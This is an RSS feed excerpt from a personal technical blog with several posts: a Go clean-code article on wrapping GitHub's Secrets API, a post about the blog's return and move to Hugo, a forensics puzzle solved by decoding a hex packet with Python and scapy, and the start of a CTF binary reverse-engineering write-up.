<p>The <code>secretsClient</code> is a <strong>service</strong> that allows us to create, upload and delete secrets using <a href="https://docs.github.com/en/rest/reference/actions#secrets">Github&rsquo;s Secrets API</a>. The <code>GithubSecretsService</code>
will have following definition (make sure to have a look at the methods provided by the <a href="https://pkg.go.dev/github.com/google/go-github/v32/github#ActionsService">ActionsService</a>):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#6ab825;font-weight:bold">type</span> GithubSecretsService <span style="color:#6ab825;font-weight:bold">interface</span> {
	<span style="color:#447fcf">GetRepoPublicKey</span>(ctx context.Context, owner, repo <span style="color:#6ab825;font-weight:bold">string</span>) (*github.PublicKey, *github.Response, <span style="color:#6ab825;font-weight:bold">error</span>)
	<span style="color:#447fcf">CreateOrUpdateRepoSecret</span>(ctx context.Context, owner, repo <span style="color:#6ab825;font-weight:bold">string</span>, eSecret *github.EncryptedSecret) (*github.Response, <span style="color:#6ab825;font-weight:bold">error</span>)
	<span style="color:#447fcf">ListRepoSecrets</span>(ctx context.Context, owner, repo <span style="color:#6ab825;font-weight:bold">string</span>, opts *github.ListOptions) (*github.Secrets, *github.Response, <span style="color:#6ab825;font-weight:bold">error</span>)
	<span style="color:#447fcf">DeleteRepoSecret</span>(ctx context.Context, owner, repo, name <span style="color:#6ab825;font-weight:bold">string</span>) (*github.Response, <span style="color:#6ab825;font-weight:bold">error</span>)
}
</code></pre></div><p>This way we can create a <code>GithubSecretsStore</code> with a mocked version of <code>GithubSecretsService</code>. But there is still something missing. Of course, the <code>Github client</code> itself:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#6ab825;font-weight:bold">type</span> GithubClient <span style="color:#6ab825;font-weight:bold">struct</span> {
	client *github.Client
}
</code></pre></div><h3 id="use-a-real-github-client">Use a real Github client</h3>
<p>And how does this structure fit together with the <strong>service</strong> and the <strong>store</strong>? Following <em>constructor</em> should provide the answer:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">NewGithubClient</span>(accessToken <span style="color:#6ab825;font-weight:bold">string</span>) GithubSecretsService {
	ctx := context.<span style="color:#447fcf">Background</span>()
	ts := oauth2.<span style="color:#447fcf">StaticTokenSource</span>(
		&amp;oauth2.Token{AccessToken: accessToken},
	)
	tc := oauth2.<span style="color:#447fcf">NewClient</span>(ctx, ts)
	client := github.<span style="color:#447fcf">NewClient</span>(tc)
	<span style="color:#6ab825;font-weight:bold">return</span> client.Actions
}
</code></pre></div><p>Here I initialize a new <code>github.Client</code> by using an OAUTH2 token. Afterwards I return <code>client.Actions</code> which btw satisfies the <code>GithubSecretsService</code> interface. Now let&rsquo;s code a constructor for the <code>GithubSecretsStore</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">NewGithubSecretsStore</span>(secretsService GithubSecretsService, repoOwner, repoName <span style="color:#6ab825;font-weight:bold">string</span>) *GithubSecretsStore {
	<span style="color:#6ab825;font-weight:bold">return</span> &amp;GithubSecretsStore{
		secretsClient: secretsService,
		repo_owner:    repoOwner,
		repo_name:     repoName,
	}
}
</code></pre></div><p>Here <code>NewGithubSecretsStore</code> expects a <code>GithubSecretsService</code> and some other additional information (repository owner/name). As the <a href="https://brainfck.org/#LSP"> Liskow Substitution Principle</a> says:</p>
<blockquote>
<p>Express dependencies between packages in terms of interfaces and not concrete types</p>
</blockquote>
<p>in <code>NewGithubSecretsStore</code> we don&rsquo;t expect an <code>ActionsService</code> as it is returned by <code>github.Client.Actions</code>. So, in order to glue everything together we&rsquo;ll have to</p>
<ul>
<li>first create a concrete implementation of <code>GithubSecretsService</code></li>
<li>and then create a new <code>GithubSecretsStore</code> with that concrete implementation</li>
</ul>
<p>So in the real code this will look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang">accessToken, err := configStore.<span style="color:#447fcf">GetValue</span>(context.<span style="color:#447fcf">Background</span>(), <span style="color:#ed9d13">&#34;github-token&#34;</span>)
<span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
    log.<span style="color:#447fcf">Fatalf</span>(<span style="color:#ed9d13">&#34;Unable to get value from config store: %s&#34;</span>, err)
}
githubSecretsClient := s.<span style="color:#447fcf">NewGithubClient</span>(accessToken)
secretsStore = s.<span style="color:#447fcf">NewGithubSecretsStore</span>(githubSecretsClient, settings.RepoOwner, settings.RepoName)
</code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Setting up a project with clean code in mind is not an easy task. You have to abstract things
and always keep in mind:</p>
<blockquote>
<p>How can you know your code works? Thatâ€™s easy. Test it. Test it again. Test it up. Test it down. Test it seven ways to Sunday &ndash; <a href="https://brainfck.org/bib.html#The%20Clean%20Code%20-%20Note%208"> Source</a></p>
</blockquote>
<p>And how do you make sure your code is <em>testable</em>? By using abstractions instead of concrete implementations and making each single part of your code <em>mockable</em> aka testable.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>4 years and 7 days later</title>
      <link>https://blog.dornea.nu/2021/02/08/4-years-and-7-days-later/</link>
      <pubDate>Mon, 08 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2021/02/08/4-years-and-7-days-later/</guid>
      <content:encoded><![CDATA[<h1 id="hello-from-the-other-side">Hello from the other side</h1>
<p>If you read this post today you might have noticed there was a huge break since the last post. More than 4 years ago I was actively blogging about <a href="/tags/security/">security</a> (mostly offensive stuff) and <a href="/tags/appsec/">appsec</a>.</p>
<p>So what happened since then? Well not only in private some things have changed but also professionally I kind of switched sides. While being involved in <em>pentests</em> for a while I decided to become more <em>blue-team</em> oriented and help others to <em>build</em> secure products. Software engineering combined with security is what still keeps me busy and also motivated.</p>
<h1 id="golang">Golang</h1>
<p>After my sabbatical from 2017 - 2018 I thought it might be the perfect time to learn a new programming language. After flirting for a while with <em>Golang</em> I&rsquo;ve ordered <a href="https://www.goodreads.com/book/show/25080953-the-go-programming-language">The Go Programming language</a> which still has been a very good introduction and many times used as a reference. And of course I was finally introduced to the world of <em>cloud computing</em>, especially to <a href="/tags/aws/">AWS</a>.</p>
<h1 id="serverless">Serverless</h1>
<p>During this journey I also realized how much potential <em>FaaS</em> has and I also started working on some private project which used Golang, Serverless and DynamoDB for storing <a href="/tags/tiddly/">TiddlyWiki</a> tiddlers in a more fancy way. The project is called <a href="https://github.com/dorneanu/widdly">widdly</a> and is a fork of <a href="https://gitlab.com/opennota/widdly">opennota/widdly</a> and has serverless and dynamodb support for Tiddlywiki. A <a href="https://tiddly.info/serverless">demo</a> is also available.</p>



<blockquote class="notice info">
  Recently I&rsquo;ve been using <a href="https://tiddlywiki.com/">TiddlyWiki</a> to build a Zettelkasten, similar to <a href="https://roamresearch.com/">roam</a>. You can find it at <a href="https://brainfck.org">brainfck.org</a>.
</blockquote>

<h1 id="migrate-from-pelican">Migrate from Pelican</h1>
<p>Before resurrecting this blog, I had to migrate all my <a href="https://github.com/dorneanu/blog/tree/master/content/posts">markdown</a> content, all my <a href="https://github.com/dorneanu/blog/tree/master/content/jupyter">jupyter notebooks</a> from Pelican to <a href="https://gohugo.io/">hugo</a>. The pelican engine did its job but it was way to slow compared to <em>hugo</em> and after all I wanted to try something new.</p>
<p>Converting <a href="/tags/ipython/">jupyter</a> notebooks was an easy task thanks to <a href="https://github.com/anthonynelzin/PelicanToHugo">PelicanToHugo</a>. With the magic of <a href="https://github.com/dorneanu/blog/blob/master/.github/workflows/main.yml">GitHub Actions</a> I am now able to separate blog content from generated HTML content <strong>and</strong> automatically deploy this blog to GitHub pages whenever content is pushed to the repository.</p>
<p>What&rsquo;s missing? Actually a lot:</p>
<ul>
<li>pictures (from old <em>dl.dornea.nu</em>)
<ul>
<li>This time I would put them into each posts folder like I did <a href="https://github.com/dorneanu/blog/tree/master/static/posts/2015-10-02-manage-a-pki-using-openssl">here</a>.</li>
</ul>
</li>
<li>since there is no <a href="/tags/graphviz/">graphviz</a> module/plugin for hugo I need a new solution
<ul>
<li>there is <a href="http://www.gravizo.com/">gravizo</a> but this is 3rd-party service which might not be available in a couple of years</li>
<li>I could parse all the graphviz code, run the <code>graphviz</code> CLI, generate the picture and adapt the markdown file (probably the preferred solution)</li>
</ul>
</li>
<li>add more <em>shortcodes</em>
<ul>
<li>e.g. for showing <a href="https://github.com/dorneanu/blog/blob/master/layouts/shortcodes/notice.html">notices</a></li>
</ul>
</li>
</ul>
<p>BTW: Read <a href="https://jawher.me/5-years-3-days-later/">here</a> why blogging is hard. With this in mind: Nice to see you again :)ï¿½</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Some forensics mini-challenge</title>
      <link>https://blog.dornea.nu/2017/02/01/some-forensics-mini-challenge/</link>
      <pubDate>Wed, 01 Feb 2017 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2017/02/01/some-forensics-mini-challenge/</guid>
      <content:encoded><![CDATA[<p>After reading <a href="https://www.elttam.com.au/blog/playing-with-canaries/">this excellent article</a> I&rsquo;ve found this <a href="https://www.elttam.com.au/roles/">page</a>. If you scroll down you&rsquo;ll find the <strong>Apply</strong> section. Not that I wanted to apply for some job but I thought, it&rsquo;d be challenging to find out the mail address:</p>
<blockquote>
<p>well, the email address is hidden below. Find the email and send your resume, solution walk-through and desired role.</p>
</blockquote>
<p>Let&rsquo;s have a look at the message:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">2c 54 2d f0 0d 2a 08 00 27 c3 59 62 08 00 45 00
01 a1 f3 33 40 00 40 06 bd 8d c0 a8 01 20 68 d2
5d fb 88 90 00 50 c9 c9 77 90 1f e5 d2 bd 50 18
00 e5 8a 29 00 00 50 4f 53 54 20 2f 63 61 72 65
65 72 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73
74 3a 20 77 77 77 2e 65 6c 74 74 61 6d 2e 63 6f
6d 2e 61 75 0d 0a 55 73 65 72 2d 41 67 65 6e 74
3a 20 65 6c 74 74 61 6d 20 72 6f 63 6b 73 21 0d
0a 41 63 63 65 70 74 2d 4c 61 6e 67 75 61 67 65
3a 20 65 6e 2d 55 53 2c 65 6e 3b 71 3d 30 2e 35
0d 0a 41 63 63 65 70 74 2d 45 6e 63 6f 64 69 6e
67 3a 20 67 7a 69 70 2c 20 64 65 66 6c 61 74 65
0d 0a 43 6f 6f 6b 69 65 3a 20 5a 57 31 68 61 57
77 39 4d 47 59 77 59 54 42 6a 4d 47 49 79 4e 54
41 77 4d 44 6b 78 4d 54 45 78 4d 44 51 77 4f 44
52 69 4d 44 59 77 59 54 41 34 4e 47 49 77 4e 44
45 77 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65
3a 20 61 70 70 6c 69 63 61 74 69 6f 6e 2f 78 2d
77 77 77 2d 66 6f 72 6d 2d 75 72 6c 65 6e 63 6f
64 65 64 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e
67 74 68 3a 20 38 31 0d 0a 43 6f 6e 6e 65 63 74
69 6f 6e 3a 20 63 6c 6f 73 65 0d 0a 0d 0a 71 3d
54 68 65 2b 65 6d 61 69 6c 2b 61 64 64 72 65 73
73 2b 69 73 2b 68 69 64 64 65 6e 2b 69 6e 2b 74
68 69 73 2b 72 65 71 75 65 73 74 26 62 6f 6e 75
73 3d 57 68 61 74 2b 69 73 2b 73 6f 75 72 63 65
2b 49 50 2b 61 64 64 72 65 73 73 0d 0a 0d 0a 00
</code></pre></div><p>Removing all the white spaces leads to:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">2c542df00d2a080027c359620800450001a1f33340004006bd8dc0a8012068d25dfb88900050c9c977901fe5d2bd501800e58a290000504f5354202f63617265657220485454502f312e310d0a486f73743a207777772e656c7474616d2e636f6d2e61750d0a557365722d4167656e743a20656c7474616d20726f636b73210d0a4163636570742d4c616e67756167653a20656e2d55532c656e3b713d302e350d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a436f6f6b69653a205a573168615777394d4759775954426a4d4749794e5441774d446b784d5445784d4451774f4452694d445977595441344e4749774e4445770d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a2038310d0a436f6e6e656374696f6e3a20636c6f73650d0a0d0a713d5468652b656d61696c2b616464726573732b69732b68696464656e2b696e2b746869732b7265717565737426626f6e75733d576861742b69732b736f757263652b49502b616464726573730d0a0d0a00
</code></pre></div><h2 id="find-out-mail-address">Find out mail address</h2>
<p>Now let&rsquo;s start <code>ipyton</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">In [1]: data=&#34;2c542df00d2a080027c359620800450001a1f33340004006bd8dc0a8012068d25dfb88900050c9c977901fe5d2bd501800e58a290000504f5354202f63617265657220485454502f312e310d0a486f73743a207777772e656c7474616d2e636f6d2e61750d0a557365722d4167656e743a20656c7474616d20726f636b73210d0a4163636570742d4c616e67756167653a20656e2d55532c656e3b713d302e350d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a436f6f6b69653a205a573168615777394d4759775954426a4d4749794e5441774d446b784d5445784d4451774f4452694d445977595441344e4749774e4445770d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a2038310d0a436f6e6e656374696f6e3a20636c6f73650d0a0d0a713d5468652b656d61696c2b616464726573732b69732b68696464656e2b696e2b746869732b7265717565737426626f6e75733d576861742b69732b736f757263652b49502b616464726573730d0a0d0a00&#34;

In [2]: import binascii

In [3]: binascii.unhexlify(data)
Out[3]: &#34;,T-\xf0\r*\x08\x00&#39;\xc3Yb\x08\x00E\x00\x01\xa1\xf33@\x00@\x06\xbd\x8d\xc0\xa8\x01 h\xd2]\xfb\x88\x90\x00P\xc9\xc9w\x90\x1f\xe5\xd2\xbdP\x18\x00\xe5\x8a)\x00\x00POST /career HTTP/1.1\r\nHost: www.elttam.com.au\r\nUser-Agent: elttam rocks!\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nCookie: ZW1haWw9MGYwYTBjMGIyNTAwMDkxMTExMDQwODRiMDYwYTA4NGIwNDEw\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 81\r\nConnection: close\r\n\r\nq=The+email+address+is+hidden+in+this+request&amp;bonus=What+is+source+IP+address\r\n\r\n\x00&#34;

In [4]: request=binascii.unhexlify(data)

In [5]: print(request)
&#39;ï¿½YE
ï¿½ï¿½3@@ï¿½ï¿½ï¿½ï¿½
 hï¿½]ï¿½ï¿½ï¿½Pï¿½ï¿½wï¿½ï¿½Ò½Pï¿½ï¿½)POST /career HTTP/1.1
Host: www.elttam.com.au
User-Agent: elttam rocks!
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: ZW1haWw9MGYwYTBjMGIyNTAwMDkxMTExMDQwODRiMDYwYTA4NGIwNDEw
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Connection: close

q=The+email+address+is+hidden+in+this+request&amp;bonus=What+is+source+IP+address
</code></pre></div><p>Let&rsquo;s have a look at the <strong>cookie</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">In [6]: cookie=&#34;ZW1haWw9MGYwYTBjMGIyNTAwMDkxMTExMDQwODRiMDYwYTA4NGIwNDEw&#34;

In [7]: import base64

In [8]: base64.dec
base64.decode        base64.decodestring  

In [8]: base64.decodestring(cookie)
Out[8]: &#39;email=0f0a0c0b250009111104084b060a084b0410&#39;
</code></pre></div><h2 id="extract-ip-address">Extract IP address</h2>
<p>First I saved the binary data as a file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">In [24]: f=open(&#34;/tmp/1.pcap&#34;, &#34;wb&#34;)
In [25]: f.write(request)
In [26]: f.close()
</code></pre></div><p><code>file</code> will tell you nothing:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">In [28]: !file /tmp/1.pcap
/tmp/1.pcap: data
</code></pre></div><p>After asking the team for some hint, it then suddenly made sense: The whole request was some <strong>raw bytes</strong>  extract from some network packet. After capturing some <code>GET</code> request with <code>tshark</code> and exporting the raw bytes, I could see some similarities:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">blackarch :: /tmp Â» hexdump -C 2.pcap
00000000  52 54 00 e6 70 bf 52 54  00 65 0a b3 08 00 45 00  |RT..p.RT.e....E.|
00000010  00 7d 26 89 40 00 40 06  5a 9e c0 a8 7a f2 3e d6  |.}&amp;.@.@.Z...z.&gt;.|
00000020  3e e3 a6 6c 00 50 24 4d  56 73 cc bc 8e e1 80 18  |&gt;..l.P$MVs......|
00000030  00 e5 b9 c3 00 00 01 01  08 0a 00 05 70 f6 06 48  |............p..H|
00000040  74 42 47 45 54 20 2f 20  48 54 54 50 2f 31 2e 31  |tBGET / HTTP/1.1|
00000050  0d 0a 48 6f 73 74 3a 20  67 6f 6f 67 6c 65 2e 64  |..Host: google.d|
00000060  65 0d 0a 55 73 65 72 2d  41 67 65 6e 74 3a 20 63  |e..User-Agent: c|
00000070  75 72 6c 2f 37 2e 35 32  2e 31 0d 0a 41 63 63 65  |url/7.52.1..Acce|
00000080  70 74 3a 20 2a 2f 2a 0d  0a 0d 0a                 |pt: */*....|
0000008b
blackarch :: /tmp Â» hexdump -C 1.pcap
00000000  2c 54 2d f0 0d 2a 08 00  27 c3 59 62 08 00 45 00  |,T-..*..&#39;.Yb..E.|
00000010  01 a1 f3 33 40 00 40 06  bd 8d c0 a8 01 20 68 d2  |...3@.@...... h.|
00000020  5d fb 88 90 00 50 c9 c9  77 90 1f e5 d2 bd 50 18  |]....P..w.....P.|
00000030  00 e5 8a 29 00 00 50 4f  53 54 20 2f 63 61 72 65  |...)..POST /care|
00000040  65 72 20 48 54 54 50 2f  31 2e 31 0d 0a 48 6f 73  |er HTTP/1.1..Hos|
00000050  74 3a 20 77 77 77 2e 65  6c 74 74 61 6d 2e 63 6f  |t: www.elttam.co|
00000060  6d 2e 61 75 0d 0a 55 73  65 72 2d 41 67 65 6e 74  |m.au..User-Agent|
00000070  3a 20 65 6c 74 74 61 6d  20 72 6f 63 6b 73 21 0d  |: elttam rocks!.|
00000080  0a 41 63 63 65 70 74 2d  4c 61 6e 67 75 61 67 65  |.Accept-Language|
00000090  3a 20 65 6e 2d 55 53 2c  65 6e 3b 71 3d 30 2e 35  |: en-US,en;q=0.5|
000000a0  0d 0a 41 63 63 65 70 74  2d 45 6e 63 6f 64 69 6e  |..Accept-Encodin|
000000b0  67 3a 20 67 7a 69 70 2c  20 64 65 66 6c 61 74 65  |g: gzip, deflate|
000000c0  0d 0a 43 6f 6f 6b 69 65  3a 20 5a 57 31 68 61 57  |..Cookie: ZW1haW|
000000d0  77 39 4d 47 59 77 59 54  42 6a 4d 47 49 79 4e 54  |w9MGYwYTBjMGIyNT|
000000e0  41 77 4d 44 6b 78 4d 54  45 78 4d 44 51 77 4f 44  |AwMDkxMTExMDQwOD|
000000f0  52 69 4d 44 59 77 59 54  41 34 4e 47 49 77 4e 44  |RiMDYwYTA4NGIwND|
00000100  45 77 0d 0a 43 6f 6e 74  65 6e 74 2d 54 79 70 65  |Ew..Content-Type|
00000110  3a 20 61 70 70 6c 69 63  61 74 69 6f 6e 2f 78 2d  |: application/x-|
00000120  77 77 77 2d 66 6f 72 6d  2d 75 72 6c 65 6e 63 6f  |www-form-urlenco|
00000130  64 65 64 0d 0a 43 6f 6e  74 65 6e 74 2d 4c 65 6e  |ded..Content-Len|
00000140  67 74 68 3a 20 38 31 0d  0a 43 6f 6e 6e 65 63 74  |gth: 81..Connect|
00000150  69 6f 6e 3a 20 63 6c 6f  73 65 0d 0a 0d 0a 71 3d  |ion: close....q=|
00000160  54 68 65 2b 65 6d 61 69  6c 2b 61 64 64 72 65 73  |The+email+addres|
00000170  73 2b 69 73 2b 68 69 64  64 65 6e 2b 69 6e 2b 74  |s+is+hidden+in+t|
</code></pre></div><p>And then I tried to think of ways how to <strong>build</strong> packets out of raw bytes. And then old-good <a href="http://www.secdev.org/projects/scapy/">scapy</a> came to my mind:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">(env) blackarch :: /tmp Â» scapy
INFO: Can&#39;t import python gnuplot wrapper . Won&#39;t be able to plot.
INFO: Can&#39;t import PyX. Won&#39;t be able to use psdump() or pdfdump().
WARNING: No route found for IPv6 destination :: (no default route?)
INFO: Can&#39;t import python Crypto lib. Won&#39;t be able to decrypt WEP.
INFO: Can&#39;t import python Crypto lib. Disabled certificate manipulation tools
Welcome to Scapy (2.3.2)
&gt;&gt;&gt; data=&#34;2c542df00d2a080027c359620800450001a1f33340004006bd8dc0a8012068d25dfb88900050c9c977901fe5d2bd501800e58a290000504f5354202f63617265657220485454502f312e310d0a486f73743a207777772e656c7474616d2e636f6d2e61750d0a557365722d4167656e743a20656c7474616d20726f636b73210d0a4163636570742d4c616e67756167653a20656e2d55532c656e3b713d302e350d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a436f6f6b69653a205a573168615777394d4759775954426a4d4749794e5441774d446b784d5445784d4451774f4452694d445977595441344e4749774e4445770d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a2038310d0a436f6e6e656374696f6e3a20636c6f73650d0a0d0a713d5468652b656d61696c2b616464726573732b69732b68696464656e2b696e2b746869732b7265717565737426626f6e75733d576861742b69732b736f757263652b49502b616464726573730d0a0d0a00&#34;
&gt;&gt;&gt; import binascii
&gt;&gt;&gt; r=binascii.unhexlify(data)
&gt;&gt;&gt; Ether(r)
&lt;Ether  dst=2c:54:2d:f0:0d:2a src=08:00:27:c3:59:62 type=IPv4 |&lt;IP  version=4L ihl=5L tos=0x0 len=417 id=62259 flags=DF frag=0L ttl=64 proto=tcp chksum=0xbd8d src=192.168.1.32 dst=104.210.93.251 options=[] |&lt;TCP  sport=34960 dport=www seq=3385423760 ack=535155389 dataofs=5L reserved=0L flags=PA window=229 chksum=0x8a29 urgptr=0 options=[] |&lt;Raw  load=&#39;POST /career HTTP/1.1\r\nHost: www.elttam.com.au\r\nUser-Agent: elttam rocks!\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nCookie: ZW1haWw9MGYwYTBjMGIyNTAwMDkxMTExMDQwODRiMDYwYTA4NGIwNDEw\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 81\r\nConnection: close\r\n\r\nq=The+email+address+is+hidden+in+this+request&amp;bonus=What+is+source+IP+address\r\n\r\n&#39; |&lt;Padding  load=&#39;\x00&#39; |&gt;&gt;&gt;&gt;&gt;
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>ringzer0 CTF - Binaries - Introduction to MIPS</title>
      <link>https://blog.dornea.nu/2016/12/09/ringzer0-ctf-binaries-introduction-to-mips/</link>
      <pubDate>Fri, 09 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/12/09/ringzer0-ctf-binaries-introduction-to-mips/</guid>
      <content:encoded><![CDATA[<h2 id="references">References</h2>
<ul>
<li><a href="https://www.cr0.org/paper/mips.elf.external.resolution.txt">https://www.cr0.org/paper/mips.elf.external.resolution.txt</a></li>
<li><a href="http://logos.cs.uic.edu/366/notes/mips%20quick%20tutorial.htm">http://logos.cs.uic.edu/366/notes/mips%20quick%20tutorial.htm</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>ringzer0 CTF - Binaries - Heap Allocator</title>
      <link>https://blog.dornea.nu/2016/11/30/ringzer0-ctf-binaries-heap-allocator/</link>
      <pubDate>Wed, 30 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/11/30/ringzer0-ctf-binaries-heap-allocator/</guid>
      <content:encoded><![CDATA[<p>First let&rsquo;s collect some information about the binary itself:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ readelf IntelligenSoftware -h
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2&#39;s complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400688
  Start of program headers:          64 (bytes into file)
  Start of section headers:          4608 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         9
  Size of section headers:           64 (bytes)
  Number of section headers:         30
  Section header string table index: 27

</code></pre></div><p>Let&rsquo;s see some code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ objdump -d IntelligentSoftware -j .text 
...
0000000000400660 &lt;main&gt;:
  400660:       48 83 ec 08             sub    $0x8,%rsp
  400664:       ba a0 10 60 00          mov    $0x6010a0,%edx
  400669:       be 87 08 40 00          mov    $0x400887,%esi
  40066e:       bf 01 00 00 00          mov    $0x1,%edi
  400673:       31 c0                   xor    %eax,%eax
  400675:       e8 26 ff ff ff          callq  4005a0 &lt;__printf_chk@plt&gt;
  40067a:       31 c0                   xor    %eax,%eax
  40067c:       e8 ff 00 00 00          callq  400780 &lt;get_flag&gt;
  400681:       31 c0                   xor    %eax,%eax
  400683:       48 83 c4 08             add    $0x8,%rsp
  400687:       c3                      retq
</code></pre></div><p>Nothing interesting here. But there is a <code>call</code> to <code>get_flag</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0000000000400780 &lt;get_flag&gt;:
  400780:       53                      push   %rbx
  400781:       bf 00 04 00 00          mov    $0x400,%edi
  400786:       e8 05 fe ff ff          callq  400590 &lt;malloc@plt&gt;
  40078b:       be 54 08 40 00          mov    $0x400854,%esi
  400790:       48 89 c3                mov    %rax,%rbx
  400793:       48 89 c2                mov    %rax,%rdx
  400651:       eb d0                   jmp    400623 &lt;__libc_csu_ctor+0x73&gt;
  400653:       66 a5                   movsw  %ds:(%rsi),%es:(%rdi)
  400655:       83 e8 02                sub    $0x2,%eax
  400658:       eb cf                   jmp    400629 &lt;__libc_csu_ctor+0x79&gt;
  40065a:       e8 01 ff ff ff          callq  400560 &lt;__stack_chk_fail@plt&gt;
  40065f:       90                      nop
</code></pre></div><p>And there is some <code>jmp</code> to a <strong>libc constructor</strong> (`__libc_csu_ctor').</p>
<h3 id="libc-constructors--destructors">Libc constructors / destructors</h3>
<p>If you don&rsquo;t have a clue what <strong>libc</strong> constructors/destructors are, make sure
you have a look at:</p>
<ul>
<li><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">Linux x86 Program Start Up</a></li>
<li><a href="http://bottomupcs.sourceforge.net/csbu/x3564.htm">Starting a process</a></li>
<li><a href="http://eli.thegreenplace.net/2012/08/13/how-statically-linked-programs-run-on-linux">How statically linked programs run on Linux</a></li>
<li><a href="http://nairobi-embedded.org/070_elf_c_runtime.html">C Run-time for ELF Executables</a></li>
</ul>
<h3 id="dynamic-analysis">Dynamic analysis</h3>
<p>Again using <code>radare</code> I&rsquo;ll disassemble <code>get_flag</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[0x00400688]&gt; pdf @ sym.get_flag
/ (fcn) sym.get_flag 73
|   sym.get_flag ();
|       |   ; CALL XREF from 0x0040067c (sym.main)
|       |   0x00400780      53             push rbx
|       |   0x00400781      bf00040000     mov edi, 0x400
|       |   0x00400786      e805feffff     call sym.imp.malloc        ;  void *malloc(size_t size);
|       |   0x0040078b      be54084000     mov esi, str.Allocating_1024_bytes__p..._n ; &#34;Allocating 1024 bytes %p....&#34; @ 0x400854
|       |   0x00400790      4889c3         mov rbx, rax
